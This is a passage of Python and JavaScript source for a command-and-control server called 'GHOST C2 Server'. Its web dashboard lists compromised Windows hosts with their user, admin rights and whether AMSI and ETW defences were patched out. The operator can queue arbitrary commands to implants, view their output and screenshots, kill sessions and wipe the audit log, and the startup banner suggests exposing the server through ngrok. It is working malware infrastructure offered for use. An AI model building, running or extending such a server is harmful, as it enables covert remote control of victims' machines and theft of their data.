      const isAdmin=s.recon?.elevated;
      return `<div class="session-item${s.session===selectedSid?' active':''}" onclick="selectSession('${esc(s.session)}')">
        <div class="si-top"><div class="sid">${esc(s.session.slice(0,28))}${s.session.length>28?'..':''}</div>
        ${isAdmin?'<span class="sbadge stale">ADM</span>':''}<span class="sbadge ${bc}">${btLabel}</span></div>
        <div class="smeta"><span class="hi">${esc(s.recon?.hostname||'unknown')}</span> &mdash; ${esc(s.remote_ip)}</div>
        <div class="smeta">${esc(s.recon?.user||'?')} &mdash; idle ${fmt(idle)}</div></div>`;
    }).join('');
  }
  window.refreshSessions=refreshSessions;

  async function selectSession(sid){
    selectedSid=sid;lastResultCount=0;
    document.getElementById('sel-sid').textContent=sid.slice(0,40);
    document.getElementById('hdr-sel').textContent=sid.slice(0,22)+'..';
    document.getElementById('hdr-sel').className='v ok';
    document.getElementById('session-header').style.display='flex';
    document.getElementById('empty-state').style.display='none';
    document.getElementById('output-pane').dataset.sid='';
    switchTab(currentTab);
    await Promise.all([refreshSessions(),fetchResults(),fetchRecon()]);
    const r2=await api('/sessions');if(!r2)return;
    let s2;try{s2=await r2.json();}catch(e){return;}
    if(!Array.isArray(s2))return;
    const cur=s2.find(s=>s.session===sid);
    selectedStatus=cur?(cur.status||'pending'):'pending';
    const isPending=selectedStatus==='pending';
    document.getElementById('pending-bar').style.display=isPending?'flex':'none';
    document.getElementById('btn-accept-hdr').style.display=isPending?'':'none';
    document.getElementById('btn-reject-hdr').style.display=isPending?'':'none';
    document.getElementById('cmd-bar').style.display=isPending?'none':'block';
    if(!isPending)document.getElementById('cmd-input').focus();
  }
  window.selectSession=selectSession;

  function switchTab(tab){
    currentTab=tab;
    document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===tab));
    const op=document.getElementById('output-pane'),rp=document.getElementById('recon-pane');
    if(selectedSid){op.style.display=tab==='output'?'flex':'none';if(tab==='output')op.style.flexDirection='column';rp.style.display=tab==='recon'?'block':'none';}
  }
  window.switchTab=switchTab;

  async function fetchResults(){
    if(!selectedSid)return;
    const r=await api('/results/'+encodeURIComponent(selectedSid));if(!r)return;
    const data=await r.json();
    const box=document.getElementById('output-pane'),tc=document.getElementById('tc-output');
    const entries=data.results||[];
    if(tc)tc.textContent=String(entries.length);
    const pollEl=document.getElementById('last-poll');
    if(pollEl){pollEl.textContent='synced '+new Date().toUTCString().slice(17,25);pollEl.style.color='var(--green)';setTimeout(()=>{if(pollEl)pollEl.style.color='var(--muted)'},1400);}
    if(!entries.length){
      if(box.dataset.sid!==selectedSid){box.innerHTML='<div style="padding:24px 18px;color:var(--muted);font-size:13px;">No output yet</div>';box.dataset.sid=selectedSid;}
      lastResultCount=0;return;
    }
    const hasNew=entries.length!==lastResultCount;
    if(!hasNew&&box.dataset.sid===selectedSid)return;
    const atBottom=box.scrollHeight-box.scrollTop-box.clientHeight<80;
    const sorted=entries.slice().sort((a,b)=>a.ts<b.ts?-1:1);
    const newCount=entries.length-lastResultCount;
    box.innerHTML=sorted.map((e,i)=>{
      if(e.output&&e.output.startsWith('[SCREENSHOT:BMP]\n')){
        const b64=e.output.slice(17).trim();
        return `<div class="result-entry${hasNew&&i>=(sorted.length-Math.max(newCount,0))?' new-flash':''}">
          <div class="result-hdr"><span class="r-idx">#${i+1}</span><span class="r-label">SCREENSHOT</span><span class="r-ts">${e.ts.replace('T',' ').slice(0,19)} UTC</span></div>
          <div style="padding:12px 16px"><img src="data:image/bmp;base64,${esc(b64)}" style="max-width:100%;border:1px solid var(--border)"></div></div>`;
      }
      const lines=esc(e.output).split('\n');
      const lineHtml=lines.map((l,li)=>`<div class="ln"><span class="ln-num">${li+1}</span><span class="ln-txt">${l||'&nbsp;'}</span></div>`).join('');
      const ts=e.ts.replace('T',' ').slice(0,19);
      const byteLen=new TextEncoder().encode(e.output).length;
      const isNew=hasNew&&i>=(sorted.length-Math.max(newCount,0));
      return `<div class="result-entry${isNew?' new-flash':''}">
        <div class="result-hdr"><span class="r-idx">#${i+1}</span><span class="r-label">OUTPUT</span><span class="r-ts">${ts} UTC</span><span class="r-len">${byteLen}B / ${lines.length} lines</span>
        <button class="r-copy" onclick="copyResult(this,${i})" title="Copy">copy</button></div>
        <div class="result-body">${lineHtml}</div></div>`;
    }).join('');
    box._entries=sorted;box.dataset.sid=selectedSid;
    if(atBottom||hasNew)box.scrollTop=box.scrollHeight;
    lastResultCount=entries.length;
  }
  window.fetchResults=fetchResults;

  function copyResult(btn,idx){
    const box=document.getElementById('output-pane');
    const e=box._entries?.[idx];if(!e)return;
    navigator.clipboard.writeText(e.output).then(()=>toast('Copied')).catch(()=>toast('Copy failed','err'));
  }
  window.copyResult=copyResult;

  async function clearResults(){
    if(!selectedSid)return;
    await api('/results/'+encodeURIComponent(selectedSid)+'?clear=1');
    lastResultCount=0;
    document.getElementById('output-pane').innerHTML='<div style="padding:24px 18px;color:var(--muted);font-size:13px;">Cleared</div>';
    document.getElementById('output-pane').dataset.sid='';
    const tc=document.getElementById('tc-output');if(tc)tc.textContent='0';
    toast('Output cleared','warn');
  }
  window.clearResults=clearResults;

  async function fetchRecon(){
    if(!selectedSid)return;
    const r=await api('/sessions');if(!r)return;
    let s3;try{s3=await r.json();}catch(e){return;}
    if(!Array.isArray(s3))return;
    const s=s3.find(x=>x.session===selectedSid);if(!s)return;
    const recon=s.recon||{};
    document.getElementById('sel-meta').textContent=[recon.hostname,s.remote_ip,recon.user].filter(Boolean).join('  /  ');
    const cells=[
      {k:'Hostname',v:recon.hostname,cls:'hi'},{k:'Username',v:recon.user,cls:''},
      {k:'Elevated',v:recon.elevated?'YES (Admin)':'NO',cls:recon.elevated?'danger':'warn'},
      {k:'Remote IP',v:s.remote_ip,cls:''},{k:'OS Build',v:recon.build,cls:''},
      {k:'AMSI',v:recon.amsi?'Patched':'No',cls:recon.amsi?'hi':'warn'},
      {k:'ETW',v:recon.etw?'Patched':'No',cls:recon.etw?'hi':'warn'},
      {k:'HW Breakpoints',v:recon.hwbps?'Cleared':'No',cls:recon.hwbps?'hi':'warn'},
      {k:'First Seen',v:s.first_seen?.replace('T',' ').slice(0,19)+' UTC',cls:''},
      {k:'Last Beacon',v:s.last_beacon?.replace('T',' ').slice(0,19)+' UTC',cls:''},
      {k:'Idle',v:fmt(s.idle_seconds||0),cls:s.idle_seconds>180?'warn':''},
      {k:'Queued Tasks',v:String(s.pending_tasks??0),cls:s.pending_tasks>0?'warn':''},
      {k:'Results',v:String(s.result_count??0),cls:''},
    ].filter(c=>c.v!=null&&c.v!==''&&c.v!=='undefined UTC');
    document.getElementById('recon-pane').innerHTML='<div class="recon-grid">'+
      cells.map(c=>`<div class="recon-cell"><div class="recon-key">${esc(c.k)}</div><div class="recon-val ${c.cls}">${esc(String(c.v))}</div></div>`).join('')+'</div>';
  }

  async function sendCmd(preset){
    if(!selectedSid)return toast('No node selected','err');
    if(selectedStatus==='pending')return toast('Accept node first','warn');
    if(selectedStatus==='rejected')return toast('Node rejected','err');
    const input=document.getElementById('cmd-input');
    const cmd=preset||input.value.trim();if(!cmd)return;
    if(!preset&&cmd){cmdHistory.unshift(cmd);if(cmdHistory.length>100)cmdHistory.pop();cmdHistIdx=-1;}
    const r=await api('/task',{method:'POST',body:JSON.stringify({session:selectedSid,cmd})});if(!r)return;
    const data=await r.json();
    if(data.status==='queued'){toast('Queued (depth='+data.queue_depth+')');if(!preset)input.value='';}
    else toast('Error: '+JSON.stringify(data),'err');
  }
  window.sendCmd=sendCmd;

  function handleKey(e){
    if(e.key==='Enter'){sendCmd();return;}
    const input=document.getElementById('cmd-input');
    if(e.key==='ArrowUp'){e.preventDefault();if(cmdHistIdx<cmdHistory.length-1){cmdHistIdx++;input.value=cmdHistory[cmdHistIdx];}}
    else if(e.key==='ArrowDown'){e.preventDefault();if(cmdHistIdx>0){cmdHistIdx--;input.value=cmdHistory[cmdHistIdx];}else{cmdHistIdx=-1;input.value='';}}
  }
  window.handleKey=handleKey;

  async function killSession(){
    if(!selectedSid||!confirm('Kill node '+selectedSid+'?'))return;
    const r=await api('/sessions/'+encodeURIComponent(selectedSid),{method:'DELETE'});if(!r)return;
    toast('Kill queued','warn');selectedSid=null;
    document.getElementById('hdr-sel').textContent='—';document.getElementById('hdr-sel').className='v dim';
    ['session-header','output-pane','recon-pane','cmd-bar'].forEach(id=>{document.getElementById(id).style.display='none';});
    document.getElementById('empty-state').style.display='flex';
    await refreshSessions();
  }
  window.killSession=killSession;

  const ac={task_queued:'var(--yellow)',kill_session:'var(--red)',beacon:'var(--green)',beacon_rejected:'var(--red)',session_accepted:'var(--green)',session_rejected:'var(--red)',payload_uploaded:'var(--orange)'};

  async function acceptSession(sid){
    const r=await api('/sessions/'+encodeURIComponent(sid)+'/accept',{method:'POST'});if(!r)return;
    if(r.ok){toast('Session accepted');}else{toast('Accept failed: '+r.status,'err');}
    fetchAudit();refreshSessions();
    if(sid===selectedSid){selectedStatus='accepted';document.getElementById('pending-bar').style.display='none';document.getElementById('btn-accept-hdr').style.display='none';document.getElementById('btn-reject-hdr').style.display='none';document.getElementById('cmd-bar').style.display='block';document.getElementById('cmd-input').focus();}
  }
  async function rejectSession(sid){
    const r=await api('/sessions/'+encodeURIComponent(sid)+'/reject',{method:'POST'});if(!r)return;
    if(r.ok){toast('Session rejected','warn');}else{toast('Reject failed: '+r.status,'err');}
    fetchAudit();refreshSessions();
    if(sid===selectedSid){selectedStatus='rejected';document.getElementById('btn-accept-hdr').style.display='none';document.getElementById('btn-reject-hdr').style.display='none';document.getElementById('pending-bar').style.display='none';}
  }
  function acceptSelected(){if(selectedSid)acceptSession(selectedSid);}
  function rejectSelected(){if(selectedSid)rejectSession(selectedSid);}
  window.acceptSelected=acceptSelected;window.rejectSelected=rejectSelected;
  window.acceptSession=acceptSession;window.rejectSession=rejectSession;

  async function fetchAudit(){
    const r=await api('/audit?limit=200');if(!r)return;
    let data;try{data=await r.json();}catch(e){return;}
    const list=document.getElementById('audit-list');
    const entries=((data&&data.entries)||[]).slice().reverse();
    if(!entries.length){list.innerHTML='<div class="no-audit">No entries</div>';return;}
    list.innerHTML=entries.map(e=>{
      const t=new Date(e.ts).toLocaleString('en-US',{timeZone:'Asia/Kathmandu',hour12:true,month:'short',day:'2-digit',hour:'numeric',minute:'2-digit',second:'2-digit'});
      const action=e.action||'';const color=ac[action]||'var(--text2)';
      const label=action.replace(/_/g,' ');const sid=e.detail?.sid||'';
      const isPending=action==='beacon'&&e.detail?.status==='pending';
      return `<div class="audit-entry ${esc(action)}">
        <div class="a-time">${t} NPT</div>
        <div class="a-action" style="color:${color}">${esc(label)}</div>
        ${sid?'<div class="a-sid">'+esc(sid.slice(0,32))+'</div>':''}
        <div class="a-ip">${esc(e.ip)}</div>
        ${isPending?'<div class="a-btns"><button class="a-accept" onclick="acceptSession(\''+esc(sid)+'\')">Accept</button><button class="a-reject" onclick="rejectSession(\''+esc(sid)+'\')">Reject</button></div>':''}
      </div>`;
    }).join('');
  }
  window.fetchAudit=fetchAudit;

  async function clearAudit(){
    if(!confirm('Clear audit log?'))return;
    await api('/audit/clear',{method:'POST'});
    document.getElementById('audit-list').innerHTML='<div class="no-audit">No entries</div>';
    toast('Audit log cleared','warn');
  }
  window.clearAudit=clearAudit;

  function fmt(s){if(!s&&s!==0)return'—';s=Math.floor(s);return s<60?s+'s':s<3600?Math.floor(s/60)+'m '+((s%60)||'')+'s':Math.floor(s/3600)+'h '+Math.floor((s%3600)/60)+'m';}
  function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}

  refreshSessions();fetchAudit();
  setInterval(()=>{refreshSessions();if(selectedSid)fetchResults();},5000);
  setInterval(fetchAudit,15000);
})();
</script></body></html>"""


@app.route("/", methods=["GET"])
def index():
    return Response(_LOGIN_HTML, mimetype="text/html",
                    headers={"Cache-Control": "no-store"})

@app.route("/dashboard", methods=["GET"])
def dashboard():
    return Response(_DASHBOARD_HTML, mimetype="text/html",
                    headers={"Cache-Control": "no-store"})

# ── Session janitor ───────────────────────────────────────────────────────────
def _janitor():
    while True:
        time.sleep(300)
        cutoff = time.time() - SESSION_TTL * 2
        with _lock:
            dead = [
                sid for sid, s in _sessions.items()
                if _iso_to_ts(s.get("last_beacon", "")) < cutoff
            ]
            for sid in dead:
                _sessions.pop(sid, None)
                _tasks.pop(sid, None)
                _results.pop(sid, None)

def _iso_to_ts(iso: str) -> float:
    try:
        return datetime.fromisoformat(iso.replace("Z", "+00:00")).timestamp()
    except Exception:
        return 0.0

# ── Console status printer ────────────────────────────────────────────────────
_RED    = "\033[91m"
_GREEN  = "\033[92m"
_YELLOW = "\033[93m"
_CYAN   = "\033[96m"
_GREY   = "\033[90m"
_BOLD   = "\033[1m"
_RESET  = "\033[0m"

def _status_printer():
    prev_count = -1
    while True:
        time.sleep(10)
        with _lock:
            count = len(_sessions)
            pending = sum(1 for s in _sessions.values() if s.get("status") == "pending")
        if count != prev_count:
            prev_count = count
            ts = datetime.now().strftime("%H:%M:%S")
            badge = f"{_GREEN}LIVE{_RESET}" if count else f"{_GREY}IDLE{_RESET}"
            pend  = f"  {_YELLOW}{pending} PENDING{_RESET}" if pending else ""
            print(f"  [{ts}] nodes={_BOLD}{count}{_RESET} {badge}{pend}")

# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(description="GHOST C2 Server")
    p.add_argument("--port",           type=int, default=8080,         help="listen port")
    p.add_argument("--host",           default="0.0.0.0",              help="bind address")
    p.add_argument("--beacon-token",   default=_CFG["beacon_token"],   help="implant beacon token (X-Beacon-Token)")
    p.add_argument("--operator-token", default=_CFG["operator_token"], help="operator token (X-Operator-Token)")
    p.add_argument("--user",           default=_CFG["dashboard_user"], help="dashboard username")
    p.add_argument("--password",       default=_CFG["dashboard_pass"], help="dashboard password")
    p.add_argument("--auto-accept",    action="store_true",            help="auto-accept all new sessions")
    args = p.parse_args()

    _CFG["beacon_token"]   = args.beacon_token
    _CFG["operator_token"] = args.operator_token
    _CFG["dashboard_user"] = args.user
    _CFG["dashboard_pass"] = args.password
    _CFG["auto_accept"]    = args.auto_accept

    threading.Thread(target=_janitor,        daemon=True).start()
    threading.Thread(target=_status_printer, daemon=True).start()

    print(f"\n{_BOLD}{_CYAN}  GHOST C2 SERVER{_RESET}")
    print(f"  {'─'*40}")
    print(f"  Listen    : {_GREEN}http://{args.host}:{args.port}{_RESET}")
    print(f"  Dashboard : {_GREEN}http://localhost:{args.port}/{_RESET}")
    print(f"  Beacon tok: {_YELLOW}{args.beacon_token[:12]}...{_RESET}")
    print(f"  Op token  : {_YELLOW}{args.operator_token[:12]}...{_RESET}")
    if args.auto_accept:
        print(f"  Auto-accept: {_GREEN}ON{_RESET}")
    print(f"\n  {_GREY}Next step: ngrok http {args.port}{_RESET}")
    print(f"  {'─'*40}\n")

    app.run(host=args.host, port=args.port, threaded=True, debug=False, use_reloader=False)

if __name__ == "__main__":
    main()
